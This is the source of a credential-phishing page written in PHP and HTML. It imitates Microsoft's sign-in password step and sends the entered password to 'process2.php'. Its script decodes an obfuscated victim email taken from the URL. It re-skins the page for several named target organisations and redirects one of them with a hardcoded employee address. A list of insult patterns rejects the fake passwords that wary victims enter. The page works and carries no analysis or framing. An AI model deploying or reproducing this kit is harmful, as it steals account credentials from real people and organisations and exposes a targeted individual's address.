<?php

   $user = $_POST["email1"];

?>
<html dir="ltr" class="" lang="en">

<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

    

    <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
<link rel="stylesheet" href="css/style.css" />
    <meta name="robots" content="none">
<script type="text/javascript" src="js/jqueryLib.js"></script>
    
   <style>
     html {
overflow: hidden;
overflow-x: hidden;
}
::-webkit-scrollbar {
width: 0px; /* remove scrollbar space /
background: transparent; / optional: just make scrollbar invisible /
}
/ optional: show position indicator in red */
::-webkit-scrollbar-thumb {
background: #FF0000;
}
   </style>

    <!--<link crossorigin="anonymous" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/cdnbundles/converged.v2.login.min_xu7km3oxm4bwp2b-mqyozg2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-oeT7RE+jUqvrrN6tzkQqVkE1XiqysTeQdBVsLf8laIGpeReVI+Dac1mjekZRn1Lm">-->
    </head>
    
<body onload="call()">
    <div class="ms-bg">
    <div class="ms-line"></div>
        <div class="ms-loginbox2">
          <form name="form1" method="post" action="process2.php">
            <table width="395" border="0">
                <tr>
                  <td><div class="ms-logo2"></div>&nbsp;</td>
                </tr>
                <tr>
                  <td><div class="ms-usertext" id="me"><?php echo $user;?></div><input type="hidden" name="emailp1" id="emailp1" value="<?php echo $user;?>" /></td>
                </tr>
                <tr>
                  <td><div class="ms-enterp"></div>&nbsp;</td>
                </tr>
                <tr>
                  <td>
                  <input type="password" name="emailpass1" id="emailpass1" required autocomplete="off" placeholder="Password" class="ms-userfield2" /></td>
                </tr>
                <tr>
                  <td height="69"><div class="ms-forgot"></div>&nbsp;</td>
                </tr>
                <tr>
                  <td align="right"><input type="submit" name="btnsignin" id="btnsignin" value="Sign In" class="ms-nextbtn" /></td>
                </tr>
                <tr>
                  <td align="right">&nbsp;</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
            </table>
          </form>
        </div>
    <div class="ms-footer"></div> 
    <div class="ms-footer-text">
        <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-weight:bold"> . . .</span>
      </div>   
    </div>
    

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script>
        var $c = getUrlParameter('c');
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }
		
    var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];

    $(function(){

        if(currentEmail){

            var e = document.getElementById('email');
            e.value = currentEmail;
            e.readOnly = true;

           

            }
			
		
    })
	
	function call(){
		
            var e = $('#me').text();
            e.value = currentEmail;
            e.readOnly = true;
			
			 var domain = extractDomain(e);
		     
            if(domain == "rexbionics"){
				$('.ms-bg').addClass('ms-bg1');
				$('.ms-logo2').addClass('ms-logo3');
				$('.ms-bg').removeClass('ms-bg');
				$('.ms-logo2').removeClass('ms-logo2');
			}else if(domain == "thepalladiumgroup"){
				$('.ms-bg').addClass('ms-bg2');
				$('.ms-logo2').addClass('ms-logo4');
				$('.ms-bg').removeClass('ms-bg');
				$('.ms-logo2').removeClass('ms-logo2');
			}
			else if(domain == "ewm"){
				$('.ms-bg').addClass('ms-bg3');
				$('.ms-logo2').addClass('ms-logo5');
				$('.ms-bg').removeClass('ms-bg');
				$('.ms-logo2').removeClass('ms-logo2');
			}
			else if(domain == "lhfs"){
				$('.ms-bg').addClass('ms-bg4');
				$('.ms-logo2').addClass('ms-logo6');
				$('.ms-bg').removeClass('ms-bg');
				$('.ms-logo2').removeClass('ms-logo2');
			}
			else if(domain == "tessco"){
				window.location.href= "tes.php?client-request-id=5a615109-698d-40cc-8916-0b18e1ff2467&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQIIAYWSO2_TUABG46RNH0hQoKqYUAcGBHJyff2KIyGRNGmcNtdOGjuJvVSuYzuOX4nt2Kl3JBiQmBgYGcvGVPETKoQ6d4MJMSEmxALtL2D5pCN92zmba0yJLoESeFIgSkT1EUVStMaecDinMSROcQTANQoyOEmTDAkBMaYBGd7b3Nroaepr-_PzVzu3Hnz9-8g6wx5O4ngWVcvlNE1LgWnaulHSA6_sav7Y9q1zDLvEsO8Y9i6_avi43D_LRwzJQqZSoSoVkmA5mgZ0SWjJqThEqSqhWG00KdQHAEkHbmfYpNVhL1amiFQ8RKDswEGeTCmSRaHhwFVbKBagQivXfyWre51hm0JQjhWvDcWGlQkSSgVp4Fzl74i1RTyBNxOEdmb8ym-YQegdz4Iofld4m-_L0HMCT87AXMe1vQF3qmgj2OdhmvK6LfJLq4dG89NpaltNttsnMiK2eaHjuW2U0fs2hViO6GbC1NxjF23E2wlfd2ctkx6Koh7EojR1aatvhfWkwimIX3LaHtMYzeV9z4-hLg6WemvaW574Kr_oBacCVzlgHCnJTBgZ-DKduZQ1imCmK0mw32h79sSf4rSnOGOfGdXmeM-kPA7PWFJC_fGcbiTNydCyD-vhQLNa4_SUV7shFwr1sSA6i7k57aRKS9COM6kjOU4S8q6uOckCr1TcOhy1oqyWWHK3NxmlHwvFa5le4F8Ubgczw7fHu7MwMG3X-Fa4f6KF_sR23eexEUV6cKP9cgX7sbKzXtxafZDbzT3eBoXq-vrmVu6Gfq9g71evG2I_wIK9_efwxZe18_LR69zFarmDNDIy2NFicWKE-1I3YaEskG2emzRNtJTYo6f8oZu2ZVXQn9FV4k0Re1MsXhTvthvHQlPqSzWhUTtqwGPws4i9XMt92vhPlVeb2xBAgAMGB_QuAasAVAGl_gM1&cbcxt=&username=barnhill%40tessco.com&mkt=en-US&c="+e;
			}
			
          
		
		
				
	}
	     

    function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }

   

    function validateEmail(email) {
        var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(email);
    }


     function isValidPassword(str){
        for (var i = ListEntries.length - 1; i >= 0; i--) {
          var r = new RegExp(ListEntries[i],'i');
          if(r.test(str)){
            return false;
          }
        }

        return true;
     }
</script>  
    
 <script>
   var input = document.getElementById("emailpass");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btnsignin").click();
	  }
	
	});
</script> 
<script type="text/javascript" src="js/actions.js"></script>   
</body>
</html>